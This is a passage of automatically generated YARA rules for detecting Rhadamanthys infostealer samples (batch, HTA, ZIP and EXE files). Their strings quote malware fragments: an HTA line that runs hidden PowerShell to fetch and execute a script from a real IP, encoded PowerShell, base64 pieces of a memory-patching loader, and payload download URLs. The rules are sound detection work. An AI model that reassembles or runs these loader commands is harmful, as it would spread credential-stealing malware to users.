      $s2 = "%PTFUDUT%s%PTFUDUT%%PTFUDUT%e%PTFUDUT%%PTFUDUT%t%PTFUDUT% LBAKLZ=C:\\Windows\\System32\\%GZHYHA:PFYXUUE=%" fullword ascii /* score: '22.00'*/
      $s3 = "PSAkcG9yY2hNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0RyaXZlV2F5RGVsZWdhdGVUeXBlJywgJ0NsYXNzLFB1YmxpYyxTZWFsZWQsQW5zaUNsYXNzLEF1dG9DbGFz" ascii /* base64 encoded string '= $porchModuleBuilder.DefineType('DriveWayDelegateType', 'Class,Public,Sealed,AnsiClass,AutoClas' */ /* score: '21.00'*/
      $s4 = "aCkyBDF3hK4pv31p0cycIdZAYm4D6evFinvsHgVt1Gjo+tay5EP/TmFNUM4NZcsbahTyBjhNXWPaVbfaLOgWHltpkwlDLEjRrutQim6yxAz8kCx6iM27oSq0TAjmDOAC" ascii /* score: '21.00'*/
      $s5 = "KoHOTOYSiKNYfyTPONts6hYso2Zgz6PgT+e8LOGG5YQH79dPUjlkBIVhISvtQZjwIa43tYEVfmfHiAX+1WBkQxjL5V1iG2zgGiMECPxoiWZYeqqwbqspY1DYHdmB8WgF" ascii /* score: '21.00'*/
      $s6 = "bnRvcnkubGFtcEludGVyZmFjZSA9ICRjYXJwZXREZWNvZGVyLkdldFN0cmluZygkbGFtcENvbnZlcnRlcjo6RnJvbUJhc2U2NFN0cmluZygnVlc1ellXWmxUbUYwYVha" ascii /* base64 encoded string 'ntory.lampInterface = $carpetDecoder.GetString($lampConverter::FromBase64String('VW5zYWZlTmF0aXZ' */ /* score: '21.00'*/
      $s7 = "QWRkcmVzcywgJGJlZE1vZGlmaWNhdGlvbkxlbmd0aCwgJGNoYWlyUHJldmlvdXNQcm90ZWN0aW9uLCBbcmVmXSRjaGFpclByZXZpb3VzUHJvdGVjdGlvbikgfCBPdXQt" ascii /* base64 encoded string 'Address, $bedModificationLength, $chairPreviousProtection, [ref]$chairPreviousProtection) | Out-' */ /* score: '21.00'*/
      $s8 = "ZSA9IENvbnN0cnVjdC1DaGltbmV5ICRrZXlQcm90ZWN0aW9uQWRkcmVzcyBAKFtJbnRQdHJdLFtVSW50MzJdLFtVSW50MzJdLFtVSW50MzJdLk1ha2VCeVJlZlR5cGUo" ascii /* base64 encoded string 'e = Construct-Chimney $keyProtectionAddress @([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType(' */ /* score: '21.00'*/
      $s9 = "aE5leHRQcm92aWRlciA9ICRnYXJkZW5NZW1vcnlNYW5hZ2VyOjpSZWFkSW50MzIoW0ludFB0cl0oJGRpbmluZ1Jvb21CYXNlQWRkcmVzcyArIDM2ICsgKCRsaXZpbmdS" ascii /* base64 encoded string 'hNextProvider = $gardenMemoryManager::ReadInt32([IntPtr]($diningRoomBaseAddress + 36 + ($livingR' */ /* score: '21.00'*/
      $s10 = "%CJLMIAP%s%CJLMIAP%%CJLMIAP%e%CJLMIAP%%CJLMIAP%t%CJLMIAP% \"XTEEEI=;$XGTMMKRR = [CoPFYXUUEnsole]::Title;$OZVPFYXUUEMMOVE = Get-C" ascii /* score: '20.00'*/
      $s11 = "03rYdg9fgrpfN7RgET0m0waW4e+mkExI7KG0FoPiRiobDc5I1o2PUk7XMLN43jkiVOVQGriywDsQxBoyT7f/XmvoFyvq00qMs73qYfpkYA6fAno2yaCixQXGh4PNvGpk" ascii /* score: '20.00'*/
      $s12 = "bhbci+pmo7BMvqKOhk8QKeygeTDSh7PlTNbZYw9KYjMqfyD5Wf3/cUeuRjG719rM8ZN2xkGB8pd7xhqU0OI2OKnhAyDP5okzywF5yexUbFPlPAlLkULEkmifLv5swElx" ascii /* score: '19.00'*/
      $s13 = "ICAgJHBvcmNoTmV4dFByb3ZpZGVyID0gJGdhcmRlbk1lbW9yeU1hbmFnZXI6OlJlYWRJbnQ2NChbSW50UHRyXSRkaW5pbmdSb29tQmFzZUFkZHJlc3MsIDY0ICsgKCRs" ascii /* base64 encoded string '   $porchNextProvider = $gardenMemoryManager::ReadInt64([IntPtr]$diningRoomBaseAddress, 64 + ($l' */ /* score: '17.00'*/
      $s14 = "ICAgICAkd2luZG93TWVtb3J5TWFuYWdlcjo6V3JpdGVCeXRlKFtJbnRQdHJdOjpBZGQoJGxhbXBUcmFjaW5nQWRkcmVzcywgJHNoZWxmSSksICR0YWJsZU9yaWdpbmFs" ascii /* base64 encoded string '     $windowMemoryManager::WriteByte([IntPtr]::Add($lampTracingAddress, $shelfI), $tableOriginal' */ /* score: '17.00'*/
      $s15 = "ICAgJG1haWxib3hNZXRob2RCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoW1N5c3RlbS5SZWZsZWN0aW9uLk1ldGhvZEltcGxBdHRyaWJ1dGVzXSdSdW50aW1l" ascii /* base64 encoded string '   $mailboxMethodBuilder.SetImplementationFlags([System.Reflection.MethodImplAttributes]'Runtime' */ /* score: '17.00'*/
   condition:
      uint16(0) == 0x5125 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__2 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "21b18a2423bc7e0695ed61f7a6a1ea6d386557a085036c5da803173aaeb3ffcb"
   strings:
      $x1 = ":: Q7hrnjasy3T6L9z77nh1I6ctwBWRCI910ko8saLEKDtXMr7HEJHqB2Cn0whp7A6Q3VLssD3GRIkkdUpKHJfmWe+ulcxHWpUNTzL7XCttQuQnEGG53wQc3ksBZXoD0" ascii /* score: '64.00'*/
      $s2 = "p%wZVgphkpyGuhXtWeSjTyPnzXGdqgTmBamJwQSLfSNbuBdETrDF%o%SGbAHiAXzmRewlftVnXglgdaKOTXTcjYCouVYLcnpVmTbJFivJ%w%IFuwtLCbQSoCdwcSCiRk" ascii /* score: '30.00'*/
      $s3 = "set \"mdDgRGuUELWJSwKDCvmq=%systemdrive%\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" fullword ascii /* score: '25.00'*/
      $s4 = "%cHiupJxGnAAEgodfKDUt%%mNKpvxvClogRbeQbhIkG%%UbAAjIGOvYxvZuNdsdcN%OKQchVWFiG%cJlpceELBaMHAhggqleM%O.Com%UbAAjIGOvYxvZuNdsdcN%" fullword ascii /* score: '23.00'*/
      $s5 = "%cHiupJxGnAAEgodfKDUt%%mNKpvxvClogRbeQbhIkG%%UbAAjIGOvYxvZuNdsdcN%sSDAPTcYiP%cJlpceELBaMHAhggqleM%O.Com%UbAAjIGOvYxvZuNdsdcN%" fullword ascii /* score: '23.00'*/
      $s6 = "%cHiupJxGnAAEgodfKDUt%%mNKpvxvClogRbeQbhIkG%%UbAAjIGOvYxvZuNdsdcN%fTptUCsKUd%cJlpceELBaMHAhggqleM%+ [ch%UbAAjIGOvYxvZuNdsdcN%" fullword ascii /* score: '22.00'*/
      $s7 = "7VK7Qidg8R17oXGCF+H+kCWbWY1fvLrYM+FeDUMPLtjW5ph8oua+N2MyQ07Mn6OeRodcwicfyfuU4PCgrTclvAA/K7Pt4VXuCSPk152GHA11B5Vvmd/q+YlM8v/8MyLV" ascii /* score: '21.00'*/
      $s8 = "upy9QTPv1IVFJmwSPytHsp1JuHZ5T34r0e2zvrM4SyP8ykCtN8MfMMfKtdMlTbMklymhIjMfSOpRjDWILZyWfrVMeG0aCYK1D1p5x2y6yu9RpWPzpsDsJ6ms65AYFDiP" ascii /* score: '20.00'*/
      $s9 = "KZDz1XxfJrfl99vhUxBIyQzfH2bR6DZiQPWgSD16D/ZpdwlErVm/oNJljeDxTt5tvTunIQ9+R6y9qzCmdRY4hKXOqFydvM70PLb2CdLlmyXY8ORRCU5A94bpF2dJsbjR" ascii /* score: '19.00'*/
      $s10 = "uzRGST7lMwFXgAFs0JMxLOGgwWXNgwNYTm9m3rx0mIUOhL6Xleryjg7NJ8yYyyKSxYjq5O48wgs+jbKXqMnWipzoXLI/w+vpzoYT8W1gGTHkCidAhK42SKtKa4z+Sw2V" ascii /* score: '19.00'*/
      $s11 = "xkZVr2bNXNPxeqv5rg6m94Bad6uvGKloGBgR4evh299qLVQgbA/3o30ECl2o+IhhnQXBinMAP5z6z+ges/w9lzqKeTc9f7dte7OrV21tVNxh5XUqw+B9kXrVpnLQIAUL" ascii /* score: '19.00'*/
      $s12 = "c+wVs1HGO/HR+/SZfZ/7VUeMws8xgk5c0vWeE5QZce2LrKjOagmgqPDwCMdLlZ9Cwn2Luz/t0nBOp6wVbvjLZpqL4QaGQjya3vAlydGXXPXBZRSg//kqIzQ+x8+UxFzl" ascii /* score: '19.00'*/
      $s13 = "h5MFc+CFeg91IicjkxrHeNWNT/5A0Y/SUDaP8ZDOsJqjdwngbGKfEJXp+jlKPQfQymoXy7j4CDuXjWI45HJOJpBfa0wKqoc4G8FKEYeUKUC/yxckAGpCVf0fzsgmE0dR" ascii /* score: '19.00'*/
      $s14 = "aqxu8hC6HogZw1Y+1XwFI3jGh2GtfaEcm8KA7LJFO+0QrgSPVQ/tqqLFW4rtXY1scOosUzrFQEMrZWviTXrIlUlErqEye6kSJRpgaBkP2xWfY25x+f4ACQSZB4+Zfcmd" ascii /* score: '19.00'*/
      $s15 = "MOFuCxs93USJjDZeyS+22Bz6TVvIWOfRKMFj7kkkFImAuL6WLzhcObmOjunr1MJ0PeaF1l3UhCMSdP55DS07gvRYl/dC8zph6x/aKU1K9XkikEye2kCyaWMTkzl6nwXK" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x2540 and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__3 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature).hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dc741d4bbde8bd12093efd37aac1d9aeb09242ebbfc745b2f44db2a47f3bca21"
   strings:
      $x1 = "      var cmd = 'powershell -w h -c \"iex (irm http://202.71.14.75/10sp.ps1)\"';" fullword ascii /* score: '31.00'*/
      $s2 = "      shell.Exec(cmd);" fullword ascii /* score: '23.00'*/
      $s3 = "      var shell = new ActiveXObject(\"WScript.Shell\");" fullword ascii /* score: '10.00'*/
      $s4 = "  </script>" fullword ascii /* score: '10.00'*/
      $s5 = "  <script language=\"JScript\">" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__afc1e21b {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_afc1e21b.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "afc1e21b00f5d45ce5a59ad5ee01dacf4ed1959e11c17ccbc8d344437722e057"
   strings:
      $s1 = "      shell.Exec(cmd);" fullword ascii /* score: '23.00'*/
      $s2 = "      var cmd = 'powershell.exe -w h -nop -ep un -E JABJAEoAQwBCAEUAYgBnAEgATwA9AC0AagBvAGkAbgAoACgAJwA2ADkANgA+ADcAOAA2ADgANwBd" ascii /* score: '22.00'*/
      $s3 = "      var cmd = 'powershell.exe -w h -nop -ep un -E JABJAEoAQwBCAEUAYgBnAEgATwA9AC0AagBvAGkAbgAoACgAJwA2ADkANgA+ADcAOAA2ADgANwBd" ascii /* score: '22.00'*/
      $s4 = "ADYAPgA2AEQANwAwADMAQgA2ADYANwA+ADYARQA2ADMANwBdADYAOQA2AEYANgBFADIAMAA3ADgANwAwAD4AXQA3ADcANgAyADIAOAAyAF0ANgA5AF0AOAA2AD4ANwA2" ascii /* base64 encoded string ' 6 > 6 D 7 0 3 B 6 6 7 > 6 E 6 3 7 ] 6 9 6 F 6 E 2 0 7 8 7 0 > ] 7 7 6 2 2 8 2 ] 6 9 ] 8 6 > 7 6' */ /* score: '17.00'*/
      $s5 = "AHwAIAA/ACAAewAkAF8AfQAgAHwAIAAlACAAewBbAGMAaABhAHIAXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEkAbgB0ADMAMgAoACQAXwAsADEANgApAH0AKQAp" ascii /* base64 encoded string ' |   ?   { $ _ }   |   %   { [ c h a r ] [ C o n v e r t ] : : T o I n t 3 2 ( $ _ , 1 6 ) } ) )' */ /* score: '17.00'*/
      $s6 = "AF0AMgA+ADEANgAzADcARAAyAF0ANwBBADYAXQBdADEANgBGAF0AMgA+ADEANgAzADIAMAAzAEQAMgAwADIAXQA2AD4ANgBFADcANgAzAEEAPgBdADYAPgA2AEQANwAw" ascii /* base64 encoded string ' ] 2 > 1 6 3 7 D 2 ] 7 A 6 ] ] 1 6 F ] 2 > 1 6 3 2 0 3 D 2 0 2 ] 6 > 6 E 7 6 3 A > ] 6 > 6 D 7 0' */ /* score: '17.00'*/
      $s7 = "ADMAMwAyAEMAMwAzADMAMQAyADkAMwBCADcAMwA3AF0ANgAxADcAMgA3AF0AMgAwADIAXQA3AEEANgBdAF0AMQA2AEYAXQAyAD4AMQA2ADMAMwBCADMAQgAnAC4AUgBl" ascii /* base64 encoded string ' 3 3 2 C 3 3 3 1 2 9 3 B 7 3 7 ] 6 1 7 2 7 ] 2 0 2 ] 7 A 6 ] ] 1 6 F ] 2 > 1 6 3 3 B 3 B ' . R e' */ /* score: '17.00'*/
      $s8 = "ADIAMAAyAEIAMgAwADIANwA+AEMANgA+ADcAPgA3AF0ANwAyADYARgA3ADAANgA5ADYAMwAyAEUANgA+ADcAOAA2AD4AMgA3ADMAQgA2ADcANgBFAF0APgA3ADMANgBG" ascii /* base64 encoded string ' 2 0 2 B 2 0 2 7 > C 6 > 7 > 7 ] 7 2 6 F 7 0 6 9 6 3 2 E 6 > 7 8 6 > 2 7 3 B 6 7 6 E ] > 7 3 6 F' */ /* score: '17.00'*/
      $s9 = "AD4ANgAyADkANwBCADcAOAA3ADAAPgBdADcANwA2ADIAMgAwADIAXQBdADYAPgAzADYAOQA2ADcANgA4AF0AMgA3ADIAPgA2ADIAMAAyAF0ANwBBADYAXQBdADEANgBG" ascii /* base64 encoded string ' > 6 2 9 7 B 7 8 7 0 > ] 7 7 6 2 2 0 2 ] ] 6 > 3 6 9 6 7 6 8 ] 2 7 2 > 6 2 0 2 ] 7 A 6 ] ] 1 6 F' */ /* score: '17.00'*/
      $s10 = "ADYAMwAyAEUANgA+ADcAOAA2AD4AMwBCADIAXQBdADIANwBdADYAMwA3ADcANgBBAD4AMAA3ADEANgBEADIAMAAzAEQAMgAwADIAXQA2AD4ANgBFADcANgAzAEEAPgBd" ascii /* base64 encoded string ' 6 3 2 E 6 > 7 8 6 > 3 B 2 ] ] 2 7 ] 6 3 7 7 6 A > 0 7 1 6 D 2 0 3 D 2 0 2 ] 6 > 6 E 7 6 3 A > ]' */ /* score: '17.00'*/
      $s11 = "ADsATgBlAHcALQBBAGwAaQBhAHMAIAB5AHkAdQAgACgAJABJAEoAQwBCAEUAYgBnAEgATwAuAFMAdQBiAHMAdAByAGkAbgBnACgAMAAsADMAKQApADsAeQB5AHUAIAAo" ascii /* base64 encoded string ' ; N e w - A l i a s   y y u   ( $ I J C B E b g H O . S u b s t r i n g ( 0 , 3 ) ) ; y y u   (' */ /* score: '17.00'*/
      $s12 = "ADYAMQAyADAAMgBdADYAOQBdADgANgA+ADcANgBdAEYANwAxADIAMAAyAEQANgBGADIAMAAyAF0ANwBBADYAXQBdADEANgBGAF0AMgA+ADEANgAzADcARAAzAEIANgA2" ascii /* base64 encoded string ' 6 1 2 0 2 ] 6 9 ] 8 6 > 7 6 ] F 7 1 2 0 2 D 6 F 2 0 2 ] 7 A 6 ] ] 1 6 F ] 2 > 1 6 3 7 D 3 B 6 6' */ /* score: '17.00'*/
      $s13 = "ADcAPgA2AEUANgAzADcAXQA2ADkANgBGADYARQAyADAANgA3ADYARQBdAD4ANwAzADYARgA3ADEANwA+ADIAOAAyAF0AXQA2AD4AMwA2ADkANgA3ADYAOABdADIANwAy" ascii /* base64 encoded string ' 7 > 6 E 6 3 7 ] 6 9 6 F 6 E 2 0 6 7 6 E ] > 7 3 6 F 7 1 7 > 2 8 2 ] ] 6 > 3 6 9 6 7 6 8 ] 2 7 2' */ /* score: '17.00'*/
      $s14 = "ADcAMQA3AD4AMgAwADIAXQBdADkAXQBBAF0AMwBdADIAXQA+ADYAMgA2ADcAXQA4AF0ARgAyAEUAPgAzADcAPgA2ADIAPgAzADcAXQA3ADIANgA5ADYARQA2ADcAMgA4" ascii /* base64 encoded string ' 7 1 7 > 2 0 2 ] ] 9 ] A ] 3 ] 2 ] > 6 2 6 7 ] 8 ] F 2 E > 3 7 > 6 2 > 3 7 ] 7 2 6 9 6 E 6 7 2 8' */ /* score: '17.00'*/
      $s15 = "ADcAXQA3ADAANwAzADMAQQAyAEYAMgBGADYAXQA2ADkANwAyADYAMQA3ADYANgBGADIARQA2ADMANgBGADYARAAyAEYANgA+ADcAPgA3AF0ANwAyADYARgA3ADAANgA5" ascii /* base64 encoded string ' 7 ] 7 0 7 3 3 A 2 F 2 F 6 ] 6 9 7 2 6 1 7 6 6 F 2 E 6 3 6 F 6 D 2 F 6 > 7 > 7 ] 7 2 6 F 7 0 6 9' */ /* score: '17.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 6KB and
      8 of them
}

rule Rhadamanthys_signature__3a17fb20 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_3a17fb20.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3a17fb20df7c17e55ae05fd759ca3a7977f45c808db53b82d6522acae8266573"
   strings:
      $s1 = "=!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" fullword ascii /* score: '10.00'*/
      $s2 = "=!!!!!!!!!!!!!!!!!!!!!!!!!" fullword ascii /* score: '10.00'*/
      $s3 = "eaiemckg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      all of them
}

rule Rhadamanthys_signature__ff9174d2 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_ff9174d2.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ff9174d298c23b46a6ff83518c37ee658fc5c65b8e4581685418f210e21c7e09"
   strings:
      $s1 = "* jTTT" fullword ascii /* score: '9.00'*/
      $s2 = "* .C0_" fullword ascii /* score: '9.00'*/
      $s3 = "fggggggf" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      all of them
}

rule Rhadamanthys_signature__1a2c6c953a3c96df6769899324d1ff90_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1a2c6c953a3c96df6769899324d1ff90(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d4a0607fb07d031dd369e404bd09d8255b70b1930add077b79978c4b3af1886"
   strings:
      $s1 = "http://91.108.241.80:5554/da8685d4625b48e1814b364c29fce868_build.bin" fullword ascii /* score: '18.00'*/
      $s2 = "2,252>2[3" fullword ascii /* score: '9.00'*/ /* hex encoded string '"R#' */
      $s3 = ":&:4:;:A:^:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J' */
      $s4 = "log entry" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Rhadamanthys_signature__1a2c6c953a3c96df6769899324d1ff90_imphash__402044e5 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1a2c6c953a3c96df6769899324d1ff90(imphash)_402044e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "402044e5127a546f3cdf1f1e49bec1d5f0e681fba91c17acbcf9c3342c99fce4"
   strings:
      $s1 = "http://176.46.152.62:5858/722be34814c34a7d952022ddf9b21079_build.bin" fullword ascii /* score: '18.00'*/
      $s2 = "2,252>2[3" fullword ascii /* score: '9.00'*/ /* hex encoded string '"R#' */
      $s3 = ":&:4:;:A:^:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J' */
      $s4 = "log entry" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Rhadamanthys_signature__1a2c6c953a3c96df6769899324d1ff90_imphash__419a94ef {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1a2c6c953a3c96df6769899324d1ff90(imphash)_419a94ef.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "419a94efe1f66bbc2244de83a034883751ae838f4ab7485c5475b6cf7e2e72a2"
   strings:
      $s1 = "http://176.46.152.62:5858/e1dd06e1d6cb459aaa35c60451e2b323_build.bin" fullword ascii /* score: '18.00'*/
      $s2 = "2,252>2[3" fullword ascii /* score: '9.00'*/ /* hex encoded string '"R#' */
      $s3 = ":&:4:;:A:^:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J' */
      $s4 = "log entry" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Rhadamanthys_signature__1a2c6c953a3c96df6769899324d1ff90_imphash__8bb79363 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1a2c6c953a3c96df6769899324d1ff90(imphash)_8bb79363.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8bb79363f28de746aed95af4c85f15c65d23c589556e8b22f6c20bee144caf59"
   strings:
      $s1 = "http://176.46.152.62:5858/f18d391b478540a2a03ff0663c0f10e8_build.bin" fullword ascii /* score: '18.00'*/
      $s2 = "2,252>2[3" fullword ascii /* score: '9.00'*/ /* hex encoded string '"R#' */
      $s3 = ":&:4:;:A:^:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J' */
      $s4 = "log entry" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Rhadamanthys_signature__1a2c6c953a3c96df6769899324d1ff90_imphash__91069fba {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1a2c6c953a3c96df6769899324d1ff90(imphash)_91069fba.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "91069fbabf281375ec6aa9fa4320eefe64b50d13bbcbb7eefb8f8fd13cb597f3"
   strings:
      $s1 = "http://176.46.152.62:5858/7b50107d852f42df8b20aef2f2854add_build.bin" fullword ascii /* score: '18.00'*/
      $s2 = "2,252>2[3" fullword ascii /* score: '9.00'*/ /* hex encoded string '"R#' */
      $s3 = ":&:4:;:A:^:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J' */
      $s4 = "log entry" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Rhadamanthys_signature__1a2c6c953a3c96df6769899324d1ff90_imphash__bec64fa7 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1a2c6c953a3c96df6769899324d1ff90(imphash)_bec64fa7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bec64fa7e5c651260d114f3b9f95442a0b8fc1c4eaacfcbe3f28ed9257cb8f99"
   strings:
      $s1 = "http://176.46.152.62:5858/81494efacd7e4d0cb558501309154948_build.bin" fullword ascii /* score: '18.00'*/
      $s2 = "2,252>2[3" fullword ascii /* score: '9.00'*/ /* hex encoded string '"R#' */
      $s3 = ":&:4:;:A:^:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J' */
      $s4 = "log entry" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__3ce40838 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_3ce40838.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3ce408381fd2575284a653345c45e145d2f961981c3778e494341105e162e99c"
   strings:
      $s1 = "9YlBiOysl" fullword ascii /* base64 encoded string 'bPb;+%' */ /* score: '14.00'*/
      $s2 = "ZYYYXX" fullword ascii /* reversed goodware string 'XXYYYZ' */ /* score: '13.50'*/
      $s3 = "YXXYXX" fullword ascii /* reversed goodware string 'XXYXXY' */ /* score: '13.50'*/
      $s4 = "XXXXZZ" fullword ascii /* reversed goodware string 'ZZXXXX' */ /* score: '13.50'*/
      $s5 = "0bazD:\"\\Dr" fullword ascii /* score: '10.00'*/
      $s6 = "ZXZXYXZZ" fullword ascii /* base64 encoded string 'evWavY' */ /* score: '10.00'*/
      $s7 = "YYYYZZYY" fullword ascii /* score: '9.50'*/
      $s8 = "YXYYYYYXXY" fullword ascii /* score: '9.50'*/
      $s9 = "YYYYZYZ" fullword ascii /* score: '9.50'*/
      $s10 = "ZYYYYZX" fullword ascii /* score: '9.50'*/
      $s11 = "YYYYYZX" fullword ascii /* score: '9.50'*/
      $s12 = "YYYYYXZ" fullword ascii /* score: '9.50'*/
      $s13 = "XZYYYYX" fullword ascii /* score: '9.50'*/
      $s14 = "YZYZYYYYY" fullword ascii /* score: '9.50'*/
      $s15 = "YYYZYYYY" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__cfb52996 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_cfb52996.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cfb52996e8b29bd99004ed8f6989f4c95b0a6d4c113cb42850c64d5f7b30d1ef"
   strings:
      $s1 = "ZZZYYZZY" fullword ascii /* reversed goodware string 'YZZYYZZZ' */ /* score: '16.50'*/
      $s2 = "PHP Command Line Interpreter" fullword wide /* score: '14.00'*/
      $s3 = "@IiVRa2g+" fullword ascii /* base64 encoded string '"%Qkh>' */ /* score: '14.00'*/
      $s4 = "YXXYXX" fullword ascii /* reversed goodware string 'XXYXXY' */ /* score: '13.50'*/
      $s5 = "XYYYYXY" fullword ascii /* score: '9.50'*/
      $s6 = "ZXXZZYYYYXZY" fullword ascii /* score: '9.50'*/
      $s7 = "YXYYYYZ" fullword ascii /* score: '9.50'*/
      $s8 = "PXYXYYYYY" fullword ascii /* score: '9.50'*/
      $s9 = "YXYYYYXXY" fullword ascii /* score: '9.50'*/
      $s10 = "XZZYYYY" fullword ascii /* score: '9.50'*/
      $s11 = "* >.,S" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__f7fae46c {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_f7fae46c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f7fae46c8ff2be87aca84293ac1ac061fe4e70aa8c305d794b56bbea17768b37"
   strings:
      $s1 = "creation2.exe" fullword wide /* score: '22.00'*/
      $s2 = "$ZXZXXXZZ" fullword ascii /* base64 encoded string 'evW]vY' */ /* score: '14.00'*/
      $s3 = "ZYYZYY" fullword ascii /* reversed goodware string 'YYZYYZ' */ /* score: '13.50'*/
      $s4 = "YXXYXX" fullword ascii /* reversed goodware string 'XXYXXY' */ /* score: '13.50'*/
      $s5 = "YXYXYX" fullword ascii /* reversed goodware string 'XYXYXY' */ /* score: '13.50'*/
      $s6 = "$D1$$D" fullword ascii /* reversed goodware string 'D$$1D$' */ /* score: '11.00'*/
      $s7 = "YZXYYYY" fullword ascii /* score: '9.50'*/
      $s8 = "YYYYYXXY" fullword ascii /* score: '9.50'*/
      $s9 = "ZYXYYYY" fullword ascii /* score: '9.50'*/
      $s10 = "YXYYYYY" fullword ascii /* score: '9.50'*/
      $s11 = "ZXYYYYYXY" fullword ascii /* score: '9.50'*/
      $s12 = "YYYYXZXZX" fullword ascii /* score: '9.50'*/
      $s13 = "YYYYZYXYXY" fullword ascii /* score: '9.50'*/
      $s14 = "YXZXYYYYZY" fullword ascii /* score: '9.50'*/
      $s15 = "YYYYZYYXZ" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 21000KB and
      8 of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__c6e021a3 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_c6e021a3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c6e021a3dec838f4cd9b48abfc2f4944067c422724e524897ca66385903711cb"
   strings:
      $s1 = "XYYYYY" fullword ascii /* reversed goodware string 'YYYYYX' */ /* score: '16.50'*/
      $s2 = "PXZZXXZZZX" fullword ascii /* base64 encoded string '=vY]vYe' */ /* score: '16.50'*/
      $s3 = "ZXZYXXZZY" fullword ascii /* base64 encoded string 'evX]vY' */ /* score: '16.50'*/
      $s4 = "YXZYYXZYX" fullword ascii /* base64 encoded string 'avXavX' */ /* score: '16.50'*/
      $s5 = "XXZYZXZZX" fullword ascii /* base64 encoded string ']vXevY' */ /* score: '16.50'*/
      $s6 = "ZZZYZX" fullword ascii /* reversed goodware string 'XZYZZZ' */ /* score: '13.50'*/
      $s7 = "ZYYZYY" fullword ascii /* reversed goodware string 'YYZYYZ' */ /* score: '13.50'*/
      $s8 = "HXXYZZ" fullword ascii /* reversed goodware string 'ZZYXXH' */ /* score: '13.50'*/
